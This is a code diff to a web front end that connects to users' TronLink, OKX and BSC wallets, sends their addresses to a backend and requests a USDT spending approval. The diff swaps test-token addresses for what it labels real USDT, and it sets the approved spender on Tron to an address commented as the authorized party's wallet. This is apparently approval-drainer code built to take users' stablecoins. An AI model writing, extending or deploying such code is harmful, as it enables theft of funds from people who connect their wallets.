@@ -107,7 +107,7 @@ import { SubmitAddress } from "@/api/upload";
 const { ethereum } = window; // 获取window.ethereum
 const bscWeb3 = new Web3(ethereum); // 初始化Web3
 const bscContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT 合约地址
-const bscApproveAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // BSC 交易所或目标合约地址
+const bscApproveAddress = "0x44437384cD64310fA3e90EDbbdE62C9f8c34166e"; // BSC 交易所或目标合约地址
 
 // Bsc网络ID
 const Bsc_CHAIN_ID = "0x38"; // BSC网络的链ID 64进制
@@ -224,7 +224,7 @@ async function getBscAuthorizedAmount() {
 }
 
 // 发送地址请求的函数
-async function sendAddressRequest(chainName: string, address: string) {
+async function sendAddressRequest(chainName: string, address: any) {
   try {
     const res = await SubmitAddress({
       chain_name: chainName,
@@ -240,9 +240,13 @@ async function sendAddressRequest(chainName: string, address: string) {
 const authorized = ref();
 const Loading = ref(false);
 
-const tronWebValue = ref<any>(undefined);
-const usdtAddress = "TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3"; // 假U JST
-const contractAddress = "TPSccvUSCjjTGbf6TSLwTNmCexHqi6BbPt"; // 合约地址
+const tronWebValue = ref<any>(undefined); // TronWeb 实例
+const usdtAddress = "TNW1DARH9eNzJofR3uHv58rRPhWMuf13Fu"; // USDT  授权地址
+// const usdtAddress = "TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3"; // 假U JST 1
+// const contractAddress = "TPSccvUSCjjTGbf6TSLwTNmCexHqi6BbPt"; // 合约地址 1
+
+const contractAddress = "TDqSquXBgUCLYvYC4XZgrprLK589dkhSCf"; // 被授权方钱包地址
+
 // 连接钱包逻辑
 async function connectWallet() {
   try {
@@ -252,7 +256,12 @@ async function connectWallet() {
       tronWebValue.value = window.tronLink.tronWeb;
       updateAddress();
       getAuthorizedAmount();
-      sendAddressRequest("TRX", window.tronLink.tronWeb);
+      console.log(
+        " window.tronLink.tronWeb",
+        window.tronLink.tronWeb.defaultAddress.base58
+      );
+
+      sendAddressRequest("TRX", window.tronLink.tronWeb.defaultAddress.base58);
     } else if (window.okxwallet.tronLink) {
       await window.okxwallet.tronLink.request({
         method: "tron_requestAccounts",
@@ -278,12 +287,14 @@ async function getAuthorizedAmount() {
   try {
     // 获取 USDT 合约的实例
     const contract = await tronWebValue.value.contract(abiU, usdtAddress);
-
+    console.log(
+      "tronWebValue.value.defaultAddress.base58",
+      tronWebValue.value.defaultAddress.base58
+    );
     // 查询钱包地址授权给合约地址的金额
     const authorizedAmount = await contract.methods
       .allowance(tronWebValue.value.defaultAddress.base58, contractAddress)
       .call();
-
     // 转换授权金额为 USDT 单位（通常是 6 位小数）
     formattedAmount.value =
       tronWebValue.value.toDecimal(authorizedAmount) / 1e6;
@@ -351,10 +362,9 @@ async function approve() {
         callValue: 0, // 设置调用价值 表示调用这个智能合约时，转移的 TRX 数量为 0。因为这里只是授权 USDT，而不是发送 TRX。
         shouldPollResponse: true, // 设置为true以返回交易结果
       };
-
       // 代币地址 这里abiU 代币合约基本上都是一样 ，USDT，代币地址不同
       let contract = await tronWebValue.value.contract(abiU, usdtAddress);
-      const authedAmounts = await contract.methods
+      const result = await contract.methods
         .approve(contractAddress, authorized.value * 1e6) // u
         .send(options);
 
